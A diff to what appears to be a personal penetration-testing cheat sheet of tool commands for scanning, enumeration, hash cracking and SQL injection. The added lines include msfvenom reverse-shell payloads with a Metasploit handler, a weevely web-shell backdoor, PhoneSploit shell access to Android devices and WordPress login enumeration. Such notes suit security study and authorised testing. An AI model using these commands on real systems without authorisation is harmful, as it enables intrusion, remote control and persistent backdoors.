@@ -4,6 +4,10 @@
 ### ADVANCED IP SCANNER ### WINDOWS
 //GUI
 
+### ALPHAPEELER ### WINDOWS
+//Cryptography
+//GUI
+
 ### ANDROID ADB ###
 adb connect IP:5555
 adb devices -l
@@ -12,18 +16,30 @@ adb shell
 ### ANDROID PHONESPLOIT ###
 sudo apt install android-tools-adb android-tools-fastboot
 sudo apt install adb
-
-git clone https://github.com/aerosol-can/PhoneSploit
-
 python3 phonesploit.py
 3 (Connect to new phone)
 Add IP address of android device
 4 (Access shell on phone)
 IP address again of android device
 
+### BCTEXTENCODER ### WINDOWS
+//Cryptography
+//GUI
+
+### CRYPTOOL ### WINDOWS
+//Cryptography
+//GUI
+
 ### DIG ###
 dig ns domain //DNS enumeration
 dig @nshostname domain axfr //Zone transfer
+
+### DSSS ###
+//sql injection
+python3 dsss.py -u URL --cokie "COOKIE"
+
+### GOBUSTER ###
+gobuster dir -u WEBSITE -w WORDLIST_PATH
 
 ### ENUM4LINUX ###
 enum4linux -u USERNAME -p PASSWORD -U IP // Users Enumeration
@@ -33,7 +49,7 @@ enum4linux -u USERNAME -p PASSWORD -G IP // Groups Information
 enum4linux -u USERNAME -p PASSWORD -S IP // Share Policy Information (SMB Shares Enumeration)
 
 ### FTP ###
-ftp IP
+ftp IP [PORT]
 
 ### GLOBAL NETWORK INVENTORY ### WINDOWS
 //GUI
@@ -44,7 +60,6 @@ https://hashes.com/en/decrypt/hash //hash cracking
 https://www.onlinehashcrack.com/hash-identification.php //hash identification
 
 ### HASHCAT ###
-
 Hashcat -a ATTACK_TYPE -m HASH_TYPE HASHLIST /WORDLIST
 -a 0 | Straight
 -a 1 | Combination
@@ -88,6 +103,28 @@ john --show hashfile/hash
 
 use auxiliary/scanner/smb/smb_version
 use auxiliary/scanner/ftp/ftp_version
+use auxiliary/scanner/http/wordpress_login_enum
+
+//reverse shell from infected machine
+#msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=IP LPORT=PORT -o PATH
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /root/Desktop/FILE /var/www/html/share
+service apache2 start
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set LHOST IP
+> set LPORT PORT
+> run/exploit
+
+//gain backdoor access via a web shell
+#msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set LHOST IP
+> set LPORT PORT
+> run/exploit
 
 ### nbtstat ### WINDOWS
 nbtstat -a IP //-a = displays the NetBIOS name table of remote host, IP = remote host IP
@@ -111,35 +148,97 @@ nikto -h DOMAIN -Tuning x //-x = include all options except specified
 nikto -h DOMAIN -Cgidirs all
 nikto -h DOMAIN -o FILENAME -F txt //saves to file
 
+### NETDISCOVER ###
+netdiscover -r IP/MASK
+
+### NETWORK TOPOLOGY MAPPER ### WINDOWS
+//network mapping tool - GUI
+
 ### NMAP / ZENMAP ###
-Scan a single IP nmap 192.168.1.1
-Scan a host nmap www.testhostname.com
-Scan a range of IPs nmap 192.168.1.1-20
-Scan a subnet nmap 192.168.1.0/24
-Scan targets from a text file nmap -iL list-of-ips.txt
-Scan a single Port nmap -p 22 192.168.1.1
-Scan a range of ports nmap -p 1-100 192.168.1.1
-Scan 100 most common ports (Fast) nmap -F 192.168.1.1
-Scan all 65535 ports nmap -p- 192.168.1.1
-Scan using TCP connect nmap -sT 192.168.1.1
-Scan using TCP SYN scan (default) nmap -sS 192.168.1.1
-Scan UDP ports nmap -sU -p 123,161,162 192.168.1.1
-Scan selected ports - ignore discovery nmap -Pn -F 192.168.1.1
-Detect OS and Services nmap -A 192.168.1.1
-Standard service detection nmap -sV 192.168.1.1
-More aggressive Service Detection nmap -sV --version-intensity 5 192.168.1.1
-Lighter banner grabbing detection nmap -sV --version-intensity 0 192.168.1.1
-Save default output to file nmap -oN outputfile.txt 192.168.1.1
-Save results as XML nmap -oX outputfile.xml 192.168.1.1
-Save results in a format for grep nmap -oG outputfile.txt 192.168.1.1
-Save in all formats nmap -oA outputfile 192.168.1.1
-Scan using default safe scripts nmap -sV -sC 192.168.1.1
-Get help for a script nmap --script-help=ssl-heartbleed
-Scan using a specific NSE script nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1
-Scan with a set of scripts nmap -sV --script=smb* 192.168.1.1
-Gather page titles from HTTP services nmap --script=http-title 192.168.1.0/24
-Get HTTP headers of web services nmap --script=http-headers 192.168.1.0/24
-Find web apps from known paths nmap --script=http-enum 192.168.1.0/24
+Scan a single IP
+nmap 192.168.1.1
+
+Scan a host
+nmap www.testhostname.com
+
+Scan a range of IPs
+nmap 192.168.1.1-20
+
+Scan a subnet
+nmap 192.168.1.0/24
+
+Scan targets from a text file
+nmap -iL list-of-ips.txt
+
+Scan a single Port
+nmap -p 22 192.168.1.1
+
+Scan a range of ports
+nmap -p 1-100 192.168.1.1
+
+Scan 100 most common ports (Fast)
+nmap -F 192.168.1.1
+
+Scan all 65535 ports
+nmap -p- 192.168.1.1
+
+Scan using TCP connect
+nmap -sT 192.168.1.1
+
+Scan using TCP SYN scan (default)
+nmap -sS 192.168.1.1
+
+Scan UDP ports
+nmap -sU -p 123,161,162 192.168.1.1
+
+Scan selected ports - ignore discovery
+nmap -Pn -F 192.168.1.1
+
+Detect OS and Services
+nmap -A 192.168.1.1
+
+Standard service detection
+nmap -sV 192.168.1.1
+
+More aggressive Service Detection
+nmap -sV --version-intensity 5 192.168.1.1
+
+Lighter banner grabbing detection
+nmap -sV --version-intensity 0 192.168.1.1
+
+Save default output to file
+nmap -oN outputfile.txt 192.168.1.1
+
+Save results as XML
+nmap -oX outputfile.xml 192.168.1.1
+
+Save results in a format for grep
+nmap -oG outputfile.txt 192.168.1.1
+
+Save in all formats
+nmap -oA outputfile 192.168.1.1
+
+Scan using default safe scripts
+nmap -sV -sC 192.168.1.1
+
+Get help for a script
+nmap --script-help=ssl-heartbleed
+
+Scan using a specific NSE script
+nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1
+
+Scan with a set of scripts
+nmap -sV --script=smb* 192.168.1.1
+
+Gather page titles from HTTP services
+nmap --script=http-title 192.168.1.0/24
+
+Get HTTP headers of web services
+nmap --script=http-headers 192.168.1.0/24
+
+Find web apps from known paths
+nmap --script=http-enum 192.168.1.0/24
+
 nmap --script smb-os-discovery.nse IP
 nmap IP --data-string "STRING" //scanning beyond ids/ips/firewall
 nmap IP --data HEX // HEX=0xdeadbeef
@@ -154,11 +253,9 @@ nmap -sU -p 161 IP //SNMP
 
 nmap -p 2049 IP //NFS enumeration
 
-### NETDISCOVER ###
-netdiscover -r IP/MASK
-
-### NETWORK TOPOLOGY MAPPER ### WINDOWS
-//network mapping tool - GUI
+nmap -sn -PR 192.168.1.1/24 -oN ip.txt
+nmap -A -T4 -vv -iL ip.txt -oN nmap.txt
+nmap -sU -sV -A -T4 -v -oN udp.txt
 
 ### RESPONDER ###
 git clone https://github.com/SpiderLabs/Responder
@@ -180,12 +277,19 @@ smbclient \\\\IP\\share
 snmp-check IP //SNMP enumeration
 
 ### SNOW ###
+//Cryptography
 SNOW.EXE -C -p PASSWORD FILE
 
 ### SSH ###
 ssh LOGIN@IP
 
+### STEGHIDE ###
+//Steganography
+steghide info FILE
+steghide extract -sf FILE
+
 ### SQLMAP ###
+//SQL injection
 SQLMAP Extract DBS
 sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --dbs
 
@@ -220,6 +324,16 @@ git clone https://github.com/p4pentest/SuperEnum
 
 ### TELNET ###
 telnet IP
+
+### UNISCAN ###
+uniscan -u URL -q //-q = scan directories in webserver
+uniscan -u URL -we //-we = file check (robots.txt and sitemap.xml)
+uniscan -u URL -d //-d = dynamic testing
+
+### WEEVELY ###
+//Gain backdoor access via a web shell
+weevely generate PASSWORD PATH_TO_SHELL_FILE
+weevely URL_TO_SHELL_FILE PASSWORD
 
 ### WPSCAN ###
 wpscan --url URL -u USERNAME -P PASSWORD/LIST
